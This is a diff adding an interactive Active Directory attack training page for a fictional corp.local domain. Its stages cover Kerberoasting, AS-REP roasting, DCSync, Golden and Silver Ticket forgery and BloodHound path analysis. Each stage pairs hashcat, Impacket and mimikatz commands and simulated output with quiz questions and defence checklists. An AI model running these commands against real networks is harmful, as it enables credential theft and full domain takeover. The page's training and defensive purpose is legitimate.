+      </div>
+    </div>
+
+    <div class="section-label">Extracted Hashes</div>
+    <div class="hash-display">
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$8f3e9a1c4b7d2e5f0a6c8b3e1d4a7f2c...<br>
+<span style="color:var(--term-dim)">$krb5tgs$23$*svc_backup$CORP.LOCAL$MSServerBU/backup01.corp.local*$2a7c4e8f1b3d9e5a6c...</span><br>
+<span style="color:var(--term-dim)">$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/intranet.corp.local:8080*$9d4f2b7e3a1c5e8f0b...</span>
+    </div>
+
+    <div class="section-label">Step 2 — Crack with Hashcat</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">kali@attacker:~$ — Hashcat RC4 TGS Crack</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-prompt">$ </span><span class="t-cmd">hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule</span>
+
+<span class="t-dim">hashcat (v6.2.6) starting...</span>
+<span class="t-dim">OpenCL API (OpenCL 3.0 CUDA 12.3.0) - Platform #1 [NVIDIA Corporation]</span>
+<span class="t-white">Device #1: NVIDIA RTX 4090, 24320/24564 MB, 128MCU</span>
+
+<span class="t-dim">Minimum password length supported: 0</span>
+<span class="t-dim">Maximum password length supported: 256</span>
+<span class="t-white">
+[...]</span>
+<span class="t-key">$krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$8f3e9a1c...:Sqlserver2019!</span>
+<span class="t-white">
+Session..........: hashcat
+Status...........: <span class="t-key">Cracked</span>
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Recovered........: 1/3 (33.33%) Digests
+Time.Elapsed.....: 0 secs, 7 msecs</span>
+      </div>
+    </div>
+
+    <!-- Exercise -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 2.1 — Attack Decision</div>
+      <p class="exercise-prompt">
+        You've cracked the <span class="inline-code">svc_mssql</span> password: <span class="inline-code">Sqlserver2019!</span>
+        The account last set its password in <strong>2019</strong>. svc_mssql has <em>db_owner</em> on the finance DB and <em>sysadmin</em> was granted manually in 2021.
+        What should your next step be?
+      </p>
+      <div class="option-list">
+        <label class="option-item"><input type="radio" name="s2e1" value="a"> Immediately log in as svc_mssql interactively — fastest path</label>
+        <label class="option-item"><input type="radio" name="s2e1" value="b"> Use svc_mssql credentials to authenticate to the SQL server, enable xp_cmdshell, and execute a reverse shell — operating within the service account context to avoid triggering user-behavior alerts</label>
+        <label class="option-item"><input type="radio" name="s2e1" value="c"> Submit the credentials to the IT helpdesk portal to verify they still work</label>
+        <label class="option-item"><input type="radio" name="s2e1" value="d"> Skip this account and crack the others first</label>
+      </div>
+      <button class="check-btn" onclick="checkS2E1()">Verify</button>
+      <div class="result-box" id="s2-r1"></div>
+    </div>
+
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 2.2 — Encryption Type Awareness</div>
+      <p class="exercise-prompt">Why do attackers prefer RC4-encrypted TGS tickets (etype 23) over AES256-encrypted tickets (etype 18) when Kerberoasting?</p>
+      <div class="option-list">
+        <label class="option-item"><input type="radio" name="s2e2" value="a"> RC4 tickets are larger and contain more data to work with</label>
+        <label class="option-item"><input type="radio" name="s2e2" value="b"> RC4 (MD4-based NTLM derivation) is computationally weaker than AES256-HMAC-SHA1 — orders of magnitude faster to crack offline with GPU acceleration</label>
+        <label class="option-item"><input type="radio" name="s2e2" value="c"> AES256 tickets expire faster, making cracking impractical</label>
+        <label class="option-item"><input type="radio" name="s2e2" value="d"> RC4 tickets do not require a valid TGT to request</label>
+      </div>
+      <button class="check-btn" onclick="checkS2E2()">Verify</button>
+      <div class="result-box" id="s2-r2"></div>
+    </div>
+
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — Kerberoasting</div>
+      <ul class="defense-list">
+        <li>Use <strong>Group Managed Service Accounts (gMSA)</strong> — 240-character auto-rotating passwords, effectively uncrackable offline</li>
+        <li>Enforce <strong>AES256-only</strong> for service accounts — disable RC4 (msDS-SupportedEncryptionTypes = 24 for AES128+AES256)</li>
+        <li>Set service account passwords to <strong>25+ random characters</strong> and rotate every 90 days if gMSA is not available</li>
+        <li>Alert on <strong>TGS-REQ bursts</strong> — a single account requesting TGS for many SPNs in seconds (Event ID 4769 — Kerberos Service Ticket Operations)</li>
+        <li>Apply <strong>least-privilege</strong> to service accounts — no Domain Admin, no unnecessary group memberships</li>
+      </ul>
+    </div>
+
+    <button class="advance-btn" id="adv1" onclick="advanceStage(1)">Advance to Stage 03: AS-REP Roasting &rarr;</button>
+  </section>
+
+  <!-- ============================================================
+       STAGE 3: AS-REP ROASTING
+       ============================================================ -->
+  <section class="stage-panel" id="stage2">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 03 of 06</div>
+      <h1 class="stage-heading">AS-REP <span>Roasting</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting</div>
+      <p class="concept-text">
+        AS-REP Roasting targets accounts with the flag <strong>"Do not require Kerberos preauthentication"</strong> (DONT_REQ_PREAUTH). Normally, a client must prove knowledge of its password hash to request a Kerberos TGT. Without pre-authentication, any unauthenticated user can send an AS-REQ for the account and receive an AS-REP containing a portion encrypted with the account's password hash.
+      </p>
+      <p class="concept-text">
+        Unlike Kerberoasting, AS-REP Roasting requires <strong>no valid credentials at all</strong> — making it a powerful pre-authentication attack vector. The tool <span class="inline-code">GetNPUsers.py</span> from Impacket handles this. The resulting AS-REP hash (type <span class="inline-code">$krb5asrep$23$</span>) is cracked the same way as Kerberoast hashes using hashcat mode 18200.
+      </p>
+      <p class="concept-text">
+        During enumeration you found an account with DONT_REQ_PREAUTH set: <strong>helpdesk.svc</strong>. This account was provisioned during a remote IT helpdesk migration in 2022. The flag was set to avoid authentication issues during setup — and was never cleared.
+      </p>
+    </div>
+
+    <div class="section-label">Identify Vulnerable Accounts</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">kali@attacker:~$ — GetNPUsers Enumeration</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-comment"># Enumerate accounts with pre-auth disabled — no credentials needed</span>
+<span class="t-prompt">$ </span><span class="t-cmd">python3 GetNPUsers.py corp.local/ -usersfile /tmp/userlist.txt -dc-ip 10.0.0.5 -no-pass</span>
+
+<span class="t-dim">Impacket v0.11.0 - Copyright 2024 Fortra</span>
+
+<span class="t-dim">[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="t-dim">[-] User karen.admin doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="t-key">$krb5asrep$23$helpdesk.svc@CORP.LOCAL:3a8f4c2e9b1d5e7a0f3c2b4a8e1f...</span>
+<span class="t-dim">[-] User tom.it doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+
+<span class="t-white">[*] 1 account vulnerable to AS-REP Roasting found</span>
+      </div>
+    </div>
+
+    <div class="section-label">Crack the AS-REP Hash</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">kali@attacker:~$ — Hashcat AS-REP Crack</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-prompt">$ </span><span class="t-cmd">hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</span>
+
+<span class="t-key">$krb5asrep$23$helpdesk.svc@CORP.LOCAL:3a8f4c2e...:Helpdesk123</span>
+
+<span class="t-white">Status: Cracked | Time: 0:00:03</span>
+      </div>
+    </div>
+
+    <!-- Exercises -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 3.1 — Vulnerability Root Cause</div>
+      <p class="exercise-prompt">What AD attribute controls whether an account is vulnerable to AS-REP Roasting?</p>
+      <div class="option-list">
+        <label class="option-item"><input type="radio" name="s3e1" value="a"> msDS-AllowedToDelegateTo</label>
+        <label class="option-item"><input type="radio" name="s3e1" value="b"> userAccountControl flag UF_DONT_REQUIRE_PREAUTH (0x400000)</label>
+        <label class="option-item"><input type="radio" name="s3e1" value="c"> servicePrincipalName attribute presence</label>
+        <label class="option-item"><input type="radio" name="s3e1" value="d"> pwdLastSet timestamp value</label>
+      </div>
+      <button class="check-btn" onclick="checkS3E1()">Verify</button>
+      <div class="result-box" id="s3-r1"></div>
+    </div>
+
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 3.2 — Impact Assessment</div>
+      <p class="exercise-prompt">
+        You cracked <span class="inline-code">helpdesk.svc / Helpdesk123</span>. The account has <em>GenericWrite</em> over 14 user objects in the HR OU.
+        What does GenericWrite over a user object allow an attacker to do? Select ALL that apply.
+      </p>
+      <div class="option-list">
+        <label class="option-item"><input type="checkbox" name="s3e2" value="a"> Set a targeted SPN on the user to Kerberoast that account</label>
+        <label class="option-item"><input type="checkbox" name="s3e2" value="b"> Modify the user's password directly without knowing the current password</label>
+        <label class="option-item"><input type="checkbox" name="s3e2" value="c"> Set the DONT_REQ_PREAUTH flag to AS-REP Roast the target user</label>
+        <label class="option-item"><input type="checkbox" name="s3e2" value="d"> Read all domain controller NTDS secrets directly</label>
+      </div>
+      <button class="check-btn" onclick="checkS3E2()">Verify</button>
+      <div class="result-box" id="s3-r2"></div>
+    </div>
+
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — AS-REP Roasting</div>
+      <ul class="defense-list">
+        <li>Audit every account for DONT_REQ_PREAUTH via: <span class="inline-code">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</span> — fix immediately</li>
+        <li>Enable <strong>Kerberos preauthentication</strong> for all accounts with no exceptions — if a legacy application requires it disabled, isolate that application</li>
+        <li>Alert on <strong>Event ID 4768</strong> AS-REQ with Pre-Authentication type 0 — these should not exist in a hardened environment</li>
+        <li>Apply <strong>Entra ID / MFA</strong> for any account that must authenticate to external systems, layering controls beyond Kerberos</li>
+      </ul>
+    </div>
+
+    <button class="advance-btn" id="adv2" onclick="advanceStage(2)">Advance to Stage 04: DCSync &rarr;</button>
+  </section>
+
+  <!-- ============================================================
+       STAGE 4: DCSYNC
+       ============================================================ -->
+  <section class="stage-panel" id="stage3">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 04 of 06</div>
+      <h1 class="stage-heading">DCSync <span>Attack</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1003.006 — OS Credential Dumping: DCSync</div>
+      <p class="concept-text">
+        DCSync abuses the <strong>MS-DRSR (Directory Replication Service Remote Protocol)</strong> — the legitimate protocol domain controllers use to synchronize the Active Directory database between themselves. An account with the <em>Replicating Directory Changes All</em> extended right can request replication of any object, including NTLM password hashes.
+      </p>
+      <p class="concept-text">
+        With the cracked credentials from the previous stages, you've escalated to a context with these rights. No code executes on the domain controller — the attack happens entirely over the network using standard replication RPCs. This is why it's so difficult to detect without dedicated tooling: from the DC's perspective, it looks like another DC requesting replication.
+      </p>
+      <p class="concept-text">
+        The primary target is <strong>krbtgt</strong> — the account whose hash is used to sign all Kerberos tickets domain-wide. With the krbtgt hash, you can forge Golden Tickets that grant persistent domain-level access even after credential resets.
+      </p>
+    </div>
+
+    <div class="section-label">DCSync Rights — Who Has Them?</div>
+    <table class="account-table">
+      <thead>
+        <tr><th>Principal</th><th>Right</th><th>Risk Level</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Domain Admins</td><td>Replicating Directory Changes All</td><td><span class="badge badge-red">Critical</span></td></tr>
+        <tr><td>Enterprise Admins</td><td>Replicating Directory Changes All</td><td><span class="badge badge-red">Critical</span></td></tr>
+        <tr><td>Domain Controllers</td><td>Replicating Directory Changes All</td><td><span class="badge badge-amber">Expected</span></td></tr>
+        <tr><td>CORP\svc_backup</td><td>Replicating Directory Changes</td><td><span class="badge badge-amber">Elevated</span></td></tr>
+        <tr><td>CORP\IT-Replication-SG</td><td>Replicating Directory Changes All</td><td><span class="badge badge-red">Critical</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="section-label">Execute DCSync — secretsdump.py</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">kali@attacker:~$ — Impacket secretsdump DCSync</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-prompt">$ </span><span class="t-cmd">python3 secretsdump.py corp.local/karen.admin:P@ssw0rd2023@10.0.0.5 -just-dc-user krbtgt</span>
+
+<span class="t-dim">Impacket v0.11.0 - Copyright 2024 Fortra</span>
+<span class="t-white">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span>
+<span class="t-white">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
+
+<span class="t-key">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+
+<span class="t-white">[*] Kerberos keys grabbed:</span>
+<span class="t-val">krbtgt:aes256-cts-hmac-sha1-96:8a4b2c9e1f3d7a5e0c8b4f2a9e3d1c7b5f0a2e4d8c6b1f3e7a9d2c0b4e8f1a3</span>
+<span class="t-val">krbtgt:aes128-cts-hmac-sha1-96:3d8f2a5c1e9b7f0d4a6c2e8b1f5d3a7c</span>
+<span class="t-val">krbtgt:des-cbc-md5:7f3a2c9e4b8d1e5f</span>
+
+<span class="t-white">[*] Cleaning up...</span>
+      </div>
+    </div>
+
+    <!-- Exercises -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 4.1 — Post-DCSync Prioritization</div>
+      <p class="exercise-prompt">
+        You successfully ran DCSync and extracted the krbtgt hash. You also have the NT hash for karen.admin (Domain Admin).
+        Rank the following actions by operational priority (select the BEST immediate next step):
+      </p>
+      <div class="option-list">
+        <label class="option-item"><input type="radio" name="s4e1" value="a"> Log in interactively to the DC as karen.admin to explore the filesystem</label>
+        <label class="option-item"><input type="radio" name="s4e1" value="b"> Use the krbtgt hash to forge a Golden Ticket — establishing persistence that survives password resets</label>
+        <label class="option-item"><input type="radio" name="s4e1" value="c"> Immediately run DCSync again to verify the hash is correct</label>
+        <label class="option-item"><input type="radio" name="s4e1" value="d"> Email karen.admin to let her know her account is compromised</label>
+      </div>
+      <button class="check-btn" onclick="checkS4E1()">Verify</button>
+      <div class="result-box" id="s4-r1"></div>
+    </div>
+
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 4.2 — Detection Awareness</div>
+      <p class="exercise-prompt">Which Windows Event IDs are most relevant for detecting a DCSync attack? Select ALL that apply.</p>
+      <div class="option-list">
+        <label class="option-item"><input type="checkbox" name="s4e2" value="a"> Event ID 4662 — Object operation performed (DS-Replication-Get-Changes-All access)</label>
+        <label class="option-item"><input type="checkbox" name="s4e2" value="b"> Event ID 4624 — Successful logon</label>
+        <label class="option-item"><input type="checkbox" name="s4e2" value="c"> Event ID 4742 — Computer account changed</label>
+        <label class="option-item"><input type="checkbox" name="s4e2" value="d"> Event ID 4929 — AD replication source naming context removed</label>
+      </div>
+      <button class="check-btn" onclick="checkS4E2()">Verify</button>
+      <div class="result-box" id="s4-r2"></div>
+    </div>
+
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — DCSync</div>
+      <ul class="defense-list">
+        <li>Audit the <strong>Domain NC ACL</strong> regularly — no non-DC accounts should have Replicating Directory Changes All. Script: <span class="inline-code">Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" | ?{$_.Rights -match "DS-Replication"}</span></li>
+        <li>Monitor <strong>Event ID 4662</strong> with access mask <span class="inline-code">0x100</span> for the GUID <span class="inline-code">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span> (DS-Replication-Get-Changes-All) — non-DC principals triggering this = immediate alert</li>
+        <li>Deploy <strong>Microsoft Defender for Identity</strong> — has built-in DCSync detection heuristics</li>
+        <li>Tier 0 accounts (krbtgt, DA) should only be used from <strong>Privileged Access Workstations (PAWs)</strong></li>
+        <li>Implement <strong>Just-In-Time (JIT) access</strong> for Domain Admin via Microsoft PIM — reduce the window of exposure</li>
+      </ul>
+    </div>
+
+    <button class="advance-btn" id="adv3" onclick="advanceStage(3)">Advance to Stage 05: Golden &amp; Silver Tickets &rarr;</button>
+  </section>
+
+  <!-- ============================================================
+       STAGE 5: GOLDEN & SILVER TICKETS
+       ============================================================ -->
+  <section class="stage-panel" id="stage4">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 05 of 06</div>
+      <h1 class="stage-heading">Golden &amp; Silver <span>Tickets</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1558.001 — Forge Kerberos Tickets: Golden Ticket | T1558.002 — Silver Ticket</div>
+      <p class="concept-text">
+        A <strong>Golden Ticket</strong> is a forged Kerberos TGT (Ticket Granting Ticket) created using the <strong>krbtgt account's NTLM hash</strong>. The DC trusts any TGT that verifies against the krbtgt key — so a forged TGT with any username, any group memberships (including Domain Admins), and any validity period is indistinguishable from a legitimate ticket. Golden Tickets persist even after user password resets — only rotating krbtgt twice kills them.
+      </p>
+      <p class="concept-text">
+        A <strong>Silver Ticket</strong> is narrower: forged using a <em>service account's</em> hash rather than krbtgt. It grants access to that specific service without ever contacting the DC — the service trusts tickets encrypted with its own key. Silver Tickets are harder to detect because they never generate DC-side Kerberos events.
+      </p>
+      <p class="concept-text">
+        You have the krbtgt hash from Stage 4. You also have the domain SID: <span class="inline-code">S-1-5-21-3847392847-1923847234-7392847234</span>. These two pieces of information are all you need to forge a ticket for any user, any group, any service, for the next 10 years.
+      </p>
+    </div>
+
+    <div class="section-label">Golden Ticket — Mimikatz</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">mimikatz # — Golden Ticket Forge</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-comment"># Forge a golden ticket for a synthetic "hacker" admin account</span>
+<span class="t-prompt">mimikatz # </span><span class="t-cmd">kerberos::golden /user:l33thax0r /domain:corp.local /sid:S-1-5-21-3847392847-1923847234-7392847234 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /groups:512,518,519,520 /ptt</span>
+
+<span class="t-dim">User      : l33thax0r</span>
+<span class="t-dim">Domain    : corp.local (CORP)</span>
+<span class="t-dim">SID       : S-1-5-21-3847392847-1923847234-7392847234</span>
+<span class="t-dim">User Id   : 500</span>
+<span class="t-dim">Groups Id : *512 518 519 520 513</span>
+<span class="t-key">ServiceKey: 31d6cfe0d16ae931b73c59d7e0c089c0 - rc4_hmac_nt</span>
+<span class="t-dim">Lifetime  : 1/1/2025 12:00:00 AM ; 1/1/2035 12:00:00 AM ; 1/1/2035 12:00:00 AM</span>
+<span class="t-white">
+[*] PAC generated
+[*] PAC signed
+[*] EncTicketPart generated
+[*] EncTicketPart encrypted
+[*] KrbCred generated
+
+Golden ticket for 'l33thax0r @ corp.local' successfully submitted for current session</span>
+      </div>
+    </div>
+
+    <div class="section-label">Silver Ticket — Service-Specific Forgery</div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot dot-red"></div>
+          <div class="terminal-dot dot-amber"></div>
+          <div class="terminal-dot dot-green"></div>
+        </div>
+        <span class="terminal-title">mimikatz # — Silver Ticket (CIFS on fileserver)</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-comment"># Silver ticket targeting CIFS service on FS01 using svc_backup hash</span>
+<span class="t-prompt">mimikatz # </span><span class="t-cmd">kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3847392847-1923847234-7392847234 /target:fs01.corp.local /service:cifs /rc4:2a7c4e8f1b3d9e5a6c4b2e8f3a0c5d7e /ptt</span>
+
+<span class="t-key">[*] Silver ticket for CIFS/fs01.corp.local injected into current session</span>
+<span class="t-white">dir \\fs01\finance$</span>
+<span class="t-white">
+ Volume in drive \\fs01\finance$ has no label.
+ Directory of \\fs01\finance$
+
+01/15/2025  08:42    &lt;DIR&gt;          .
+01/15/2025  08:42    &lt;DIR&gt;          ..
+01/12/2025  14:33       48,382,976  Q4_Financial_Report_FINAL.xlsx
+01/10/2025  09:17       12,847,104  Payroll_2025_ALL_EMPLOYEES.xlsx
+01/15/2025  08:42          892,416  M&amp;A_Project_Titan_CONFIDENTIAL.docx</span>
+      </div>
+    </div>
+
+    <!-- Exercises -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 5.1 — Golden vs. Silver Ticket</div>
+      <p class="exercise-prompt">Match each statement to the correct ticket type. Select the statement that is TRUE about Golden Tickets:</p>
+      <div class="option-list">
+        <label class="option-item"><input type="radio" name="s5e1" value="a"> Requires the target service account hash and grants access to one specific service on one specific host</label>
+        <label class="option-item"><input type="radio" name="s5e1" value="b"> Uses the krbtgt hash to forge a TGT that can request any TGS for any service across the domain</label>
+        <label class="option-item"><input type="radio" name="s5e1" value="c"> Requires contacting the domain controller once to validate the forged ticket</label>
+        <label class="option-item"><input type="radio" name="s5e1" value="d"> Can only be forged if the attacker has the cleartext krbtgt password</label>
+      </div>
+      <button class="check-btn" onclick="checkS5E1()">Verify</button>
+      <div class="result-box" id="s5-r1"></div>
+    </div>
+
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 5.2 — Persistence Strategy</div>
+      <p class="exercise-prompt">
+        The blue team discovers the compromise and resets the krbtgt password once. Your Golden Ticket is still valid.
+        What is the blue team's correct remediation for Golden Ticket attacks? Select ALL correct actions:
+      </p>
+      <div class="option-list">
+        <label class="option-item"><input type="checkbox" name="s5e2" value="a"> Reset the krbtgt password <strong>twice</strong> within a short window (the previous password version must also be rotated)</label>
+        <label class="option-item"><input type="checkbox" name="s5e2" value="b"> Monitor for TGTs with lifetimes exceeding the domain's configured maximum (flag TGTs &gt; 10 hours)</label>
+        <label class="option-item"><input type="checkbox" name="s5e2" value="c"> Reset the krbtgt password once and notify all admins to re-authenticate</label>
+        <label class="option-item"><input type="checkbox" name="s5e2" value="d"> Monitor for Kerberos events with users not present in the directory (SID-based lookups returning no user object)</label>
+      </div>
+      <button class="check-btn" onclick="checkS5E2()">Verify</button>
+      <div class="result-box" id="s5-r2"></div>
+    </div>
+
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — Golden &amp; Silver Tickets</div>
+      <ul class="defense-list">
+        <li>Rotate <strong>krbtgt password twice</strong> on any suspected compromise — Microsoft provides the <em>New-KrbtgtKeys.ps1</em> script for controlled rotation with replication wait</li>
+        <li>Set <strong>Kerberos ticket lifetime</strong> to 10 hours max (Group Policy: Computer Config &gt; Windows Settings &gt; Security Settings &gt; Account Policies &gt; Kerberos Policy)</li>
+        <li>Alert on TGTs with <strong>SID history</strong> containing Tier 0 SIDs from accounts not in privileged groups — Golden Tickets often stuff groups:512 (DA) into forged tickets for non-DA users</li>
+        <li>Silver Tickets bypass the DC entirely — detect via <strong>service-side logging</strong> and anomaly detection on access patterns (accessing CIFS from a host that has never connected before)</li>
+        <li>Enable <strong>PAC validation</strong> on sensitive services (KerberosValidateKdcPacSignature) — services re-validate PAC signatures with the DC for privileged operations</li>
+      </ul>
+    </div>
+
+    <button class="advance-btn" id="adv4" onclick="advanceStage(4)">Advance to Stage 06: BloodHound Analysis &rarr;</button>
+  </section>
+
+  <!-- ============================================================
+       STAGE 6: BLOODHOUND ATTACK PATH ANALYSIS
+       ============================================================ -->
+  <section class="stage-panel" id="stage5">
+    <div class="stage-intro">
+      <div class="stage-badge"><span class="stage-badge-dot"></span>Stage 06 of 06</div>
+      <h1 class="stage-heading">BloodHound <span>Attack Path Analysis</span></h1>
+      <div class="mitre-ref">MITRE ATT&amp;CK: T1482 — Domain Trust Discovery | T1078 — Valid Accounts</div>
+      <p class="concept-text">
+        BloodHound maps Active Directory relationships as a graph database, revealing attack paths that are invisible in raw LDAP queries. SharpHound (the collection agent) harvests group memberships, session data, ACLs, trusts, and local admin rights — feeding Neo4j where Cypher queries reveal shortest paths from any compromised user to Domain Admin.
+      </p>
+      <p class="concept-text">
+        The graph below represents a simplified version of the CORP.LOCAL attack surface collected during this engagement. Each node is an AD object — user, group, computer, or OU. Edges represent relationships: <em>MemberOf</em>, <em>AdminTo</em>, <em>HasSession</em>, <em>GenericWrite</em>, <em>WriteDacl</em>, and more. The critical path (red dashes) is the shortest path from your owned node to Domain Admins.
+      </p>
+    </div>
+
+    <div class="section-label">Attack Graph — CORP.LOCAL</div>
+    <div class="graph-container">
+      <svg class="graph-svg-wrap" id="bhGraph" viewBox="0 0 900 300">
+        <!-- Edges — drawn first so nodes sit on top -->
+        <!-- jsmith -> IT-Support-SG -->
+        <line class="bh-edge" x1="80" y1="150" x2="230" y2="100" stroke="#9333ea"/>
+        <!-- IT-Support-SG -> WS-042 -->
+        <line class="bh-edge" x1="230" y1="100" x2="390" y2="80" stroke="#9333ea"/>
+        <!-- WS-042 -> karen.admin (HasSession) -->
+        <line class="bh-edge critical" id="edge-session" x1="390" y1="80" x2="540" y2="50" stroke="#ef4444"/>
+        <!-- karen.admin -> Domain Admins -->
+        <line class="bh-edge critical" x1="540" y1="50" x2="700" y2="100" stroke="#ef4444"/>
+        <!-- Domain Admins -> DC01 -->
+        <line class="bh-edge critical" x1="700" y1="100" x2="820" y2="150" stroke="#ef4444"/>
+        <!-- helpdesk.svc -> HR-Users OU -->
+        <line class="bh-edge" x1="80" y1="240" x2="230" y2="220" stroke="#9333ea"/>
+        <!-- HR-Users -> WS-042 (alt path) -->
+        <line class="bh-edge" x1="230" y1="220" x2="390" y2="80" stroke="#6b21a8" stroke-dasharray="4 4"/>
+        <!-- svc_mssql -> DB01 -->
+        <line class="bh-edge" x1="540" y1="200" x2="700" y2="220" stroke="#9333ea"/>
+        <!-- DB01 -> DC01 (AdminTo) -->
+        <line class="bh-edge" x1="700" y1="220" x2="820" y2="150" stroke="#9333ea"/>
+
+        <!-- Edge labels -->
+        <text x="145" y="112" class="bh-label" fill="#9333ea" font-size="8">MemberOf</text>
+        <text x="300" y="75" class="bh-label" fill="#9333ea" font-size="8">AdminTo</text>
+        <text x="455" y="48" class="bh-label" fill="#ef4444" font-size="8">HasSession</text>
+        <text x="608" y="62" class="bh-label" fill="#ef4444" font-size="8">MemberOf</text>
+        <text x="748" y="118" class="bh-label" fill="#ef4444" font-size="8">AdminTo</text>
+        <text x="605" y="228" class="bh-label" fill="#9333ea" font-size="8">LocalAdmin</text>
+
+        <!-- Nodes -->
+        <!-- jsmith (owned) -->
+        <g class="bh-node" id="n-jsmith" onclick="selectNode('jsmith')">
+          <circle cx="80" cy="150" r="22" fill="#1a2035" stroke="#22c55e" stroke-width="2.5"/>
+          <text class="bh-label" x="80" y="147" fill="#22c55e" font-size="8">jsmith</text>
+          <text class="bh-label" x="80" y="158" fill="#166534" font-size="7">OWNED</text>
+        </g>
+        <!-- helpdesk.svc (owned) -->
+        <g class="bh-node" id="n-helpdesk" onclick="selectNode('helpdesk')">
+          <circle cx="80" cy="240" r="22" fill="#1a2035" stroke="#22c55e" stroke-width="2"/>
+          <text class="bh-label" x="80" y="237" fill="#22c55e" font-size="7">helpdesk</text>
+          <text class="bh-label" x="80" y="248" fill="#166534" font-size="7">.svc OWNED</text>
+        </g>
+        <!-- IT-Support-SG -->
+        <g class="bh-node" id="n-itsupport" onclick="selectNode('itsupport')">
+          <circle cx="230" cy="100" r="20" fill="#1a2035" stroke="#9333ea"/>
+          <text class="bh-label" x="230" y="97" fill="#c084fc" font-size="7">IT-Support</text>
+          <text class="bh-label" x="230" y="107" fill="#6b21a8" font-size="7">GROUP</text>
+        </g>
+        <!-- HR-Users -->
+        <g class="bh-node" id="n-hrusers" onclick="selectNode('hrusers')">
+          <circle cx="230" cy="220" r="20" fill="#1a2035" stroke="#9333ea"/>
+          <text class="bh-label" x="230" y="217" fill="#c084fc" font-size="7">HR-Users</text>
+          <text class="bh-label" x="230" y="227" fill="#6b21a8" font-size="7">GROUP</text>
+        </g>
+        <!-- WS-042 -->
+        <g class="bh-node" id="n-ws042" onclick="selectNode('ws042')">
+          <circle cx="390" cy="80" r="20" fill="#1a2035" stroke="#9333ea"/>
+          <text class="bh-label" x="390" y="77" fill="#c084fc" font-size="7">WS-042</text>
+          <text class="bh-label" x="390" y="87" fill="#6b21a8" font-size="7">COMPUTER</text>
+        </g>
+        <!-- svc_mssql (owned) -->
+        <g class="bh-node" id="n-mssql" onclick="selectNode('mssql')">
+          <circle cx="540" cy="200" r="20" fill="#1a2035" stroke="#22c55e"/>
+          <text class="bh-label" x="540" y="197" fill="#22c55e" font-size="7">svc_mssql</text>
+          <text class="bh-label" x="540" y="207" fill="#166534" font-size="7">OWNED</text>
+        </g>
+        <!-- karen.admin (high value) -->
+        <g class="bh-node" id="n-karen" onclick="selectNode('karen')">
+          <circle cx="540" cy="50" r="22" fill="#2a1015" stroke="#ef4444"/>
+          <text class="bh-label" x="540" y="47" fill="#f87171" font-size="7">karen.admin</text>
